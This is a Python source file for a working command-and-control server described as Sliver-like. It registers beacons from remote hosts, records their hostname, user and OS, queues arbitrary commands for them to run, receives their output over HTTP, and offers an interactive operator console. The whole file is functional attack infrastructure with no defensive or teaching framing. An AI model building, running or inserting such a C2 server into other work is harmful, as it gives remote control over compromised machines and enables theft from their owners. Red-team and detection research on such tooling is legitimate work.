#!/usr/bin/env python3
"""
Advanced C2 Server with Sliver-like interactive console
Supports multiple beacons, task queues, and persistent storage.
"""

import json
import sqlite3
import threading
import time
import urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

import cmd2

# ---------- Database handling ----------
DB_FILE = "c2_beacons.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS beacons
                 (id TEXT PRIMARY KEY,
                  ip TEXT,
                  hostname TEXT,
                  username TEXT,
                  os_version TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  status TEXT,
                  sleep_interval INTEGER,
                  tasks TEXT)''')
    conn.commit()
    conn.close()

def add_or_update_beacon(beacon_id, ip, hostname, username, os_version, sleep_interval=5):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("SELECT * FROM beacons WHERE id = ?", (beacon_id,))
    if c.fetchone():
        c.execute("UPDATE beacons SET last_seen = ?, status = 'active', ip = ?, hostname = ?, username = ?, os_version = ? WHERE id = ?",
                  (now, ip, hostname, username, os_version, beacon_id))
    else:
        c.execute("INSERT INTO beacons VALUES (?,?,?,?,?,?,?,?,?,?)",
                  (beacon_id, ip, hostname, username, os_version, now, now, 'active', sleep_interval, json.dumps([])))
    conn.commit()
    conn.close()

def get_all_beacons():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, ip, hostname, username, os_version, last_seen, status FROM beacons")
    beacons = c.fetchall()
    conn.close()
    return beacons

def queue_task(beacon_id, command):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT tasks FROM beacons WHERE id = ?", (beacon_id,))
    row = c.fetchone()
    if row:
        tasks = json.loads(row[0])
        tasks.append(command)
        c.execute("UPDATE beacons SET tasks = ? WHERE id = ?", (json.dumps(tasks), beacon_id))
    conn.commit()
    conn.close()

def get_next_task(beacon_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT tasks FROM beacons WHERE id = ?", (beacon_id,))
    row = c.fetchone()
    if row:
        tasks = json.loads(row[0])
        if tasks:
            next_task = tasks.pop(0)
            c.execute("UPDATE beacons SET tasks = ? WHERE id = ?", (json.dumps(tasks), beacon_id))
            conn.commit()
            conn.close()
            return next_task
    conn.close()
    return None

def update_beacon_status(beacon_id, status):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE beacons SET status = ? WHERE id = ?", (status, beacon_id))
    conn.commit()
    conn.close()

def delete_beacon(beacon_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM beacons WHERE id = ?", (beacon_id,))
    conn.commit()
    conn.close()

# ---------- HTTP Request Handler ----------
class C2HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress verbose HTTP logs
        pass

    def do_GET(self):
        if self.path.startswith('/command/'):
            beacon_id = self.path.split('/')[-1]
            task = get_next_task(beacon_id)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(task.encode() if task else b'')
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/register':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            try:
                info = json.loads(data.decode())
                beacon_id = info.get('id')
                ip = self.client_address[0]
                hostname = info.get('hostname', 'unknown')
                username = info.get('username', 'unknown')
                os_version = info.get('os', 'unknown')
                sleep_interval = info.get('sleep', 5)
                add_or_update_beacon(beacon_id, ip, hostname, username, os_version, sleep_interval)
                self.send_response(200)
            except Exception as e:
                print(f"[!] Registration error: {e}")
                self.send_response(500)
            self.end_headers()

        elif self.path == '/callback':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            params = urllib.parse.parse_qs(data.decode())
            beacon_id = params.get('id', [''])[0]
            output = params.get('output', [''])[0]
            if beacon_id:
                # Print callback to console in a nice format
                print(f"\n[+] Callback from {beacon_id}:\n{output}\n")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

# ---------- C2 Server Wrapper ----------
class C2Server:
    def __init__(self, port=8080):
        self.port = port
        self.httpd = None
        self.thread = None

    def start(self):
        self.httpd = HTTPServer(('0.0.0.0', self.port), C2HTTPHandler)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"[+] C2 Server listening on port {self.port}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.thread.join()
            print("[*] C2 Server stopped.")

# ---------- Interactive Shell (cmd2) ----------
class C2Shell(cmd2.Cmd):
    def __init__(self):
        super().__init__()
        self.server = C2Server()
        self.prompt = 'c2> '
        self.intro = """
        ╔═══════════════════════════════════════╗
        ║   Advanced C2 Console (Sliver-like)   ║
        ║   Type 'help' for available commands  ║
        ╚═══════════════════════════════════════╝
        """
        self.current_beacon = None

    def do_start(self, arg):
        """Start the C2 HTTP server"""
        self.server.start()

    def do_stop(self, arg):
        """Stop the C2 HTTP server and exit"""
        self.server.stop()
        return True

    def do_beacons(self, arg):
        """List all registered beacons"""
        beacons = get_all_beacons()
        if not beacons:
            print("[!] No beacons found.")
            return
        print(f"\n{'ID':<36} {'IP':<15} {'Hostname':<20} {'User':<15} {'Status':<10} {'Last Seen'}")
        print("-" * 100)
        for b in beacons:
            print(f"{b[0]:<36} {b[1]:<15} {b[2]:<20} {b[3]:<15} {b[6]:<10} {b[5]}")
        print()

    def do_use(self, arg):
        """Select a beacon to interact with. Usage: use <beacon_id>"""
        if not arg:
            print("Usage: use <beacon_id>")
            return
        beacon_id = arg.strip()
        # Verify beacon exists
        beacons = get_all_beacons()
        if not any(b[0] == beacon_id for b in beacons):
            print(f"[!] Beacon {beacon_id} not found.")
            return
        self.current_beacon = beacon_id
        self.prompt = f"c2 ({beacon_id[:8]}..)> "
        print(f"[*] Now interacting with beacon {beacon_id}")

    def do_back(self, arg):
        """Return to global context"""
        self.current_beacon = None
        self.prompt = "c2> "
        print("[*] Returned to global context")

    def do_task(self, arg):
        """Queue a command for the current beacon. Usage: task <command>"""
        if not self.current_beacon:
            print("[!] No beacon selected. Use 'use <beacon_id>' first.")
            return
        if not arg:
            print("Usage: task <command>")
            return
        queue_task(self.current_beacon, arg)
        print(f"[*] Command queued for {self.current_beacon}")

    def do_tasks(self, arg):
        """Show pending tasks for the current beacon"""
        if not self.current_beacon:
            print("[!] No beacon selected.")
            return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT tasks FROM beacons WHERE id = ?", (self.current_beacon,))
        row = c.fetchone()
        conn.close()
        if row:
            tasks = json.loads(row[0])
            if tasks:
                print(f"\nPending tasks for {self.current_beacon}:")
                for i, t in enumerate(tasks, 1):
                    print(f"  {i}. {t}")
            else:
                print("[*] No pending tasks.")
        else:
            print("[!] Beacon not found.")

    def do_clear_tasks(self, arg):
        """Clear all pending tasks for the current beacon"""
        if not self.current_beacon:
            print("[!] No beacon selected.")
            return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE beacons SET tasks = ? WHERE id = ?", (json.dumps([]), self.current_beacon))
        conn.commit()
        conn.close()
        print(f"[*] Cleared all tasks for {self.current_beacon}")

    def do_remove(self, arg):
        """Remove a beacon from the database. Usage: remove <beacon_id>"""
        if not arg:
            print("Usage: remove <beacon_id>")
            return
        beacon_id = arg.strip()
        delete_beacon(beacon_id)
        print(f"[*] Removed beacon {beacon_id}")
        if self.current_beacon == beacon_id:
            self.current_beacon = None
            self.prompt = "c2> "

    def do_exit(self, arg):
        """Exit the C2 console"""
        self.server.stop()
        return True

    # Shortcuts
    do_quit = do_exit

# ---------- Main ----------
if __name__ == "__main__":
    init_db()
    shell = C2Shell()
    shell.cmdloop()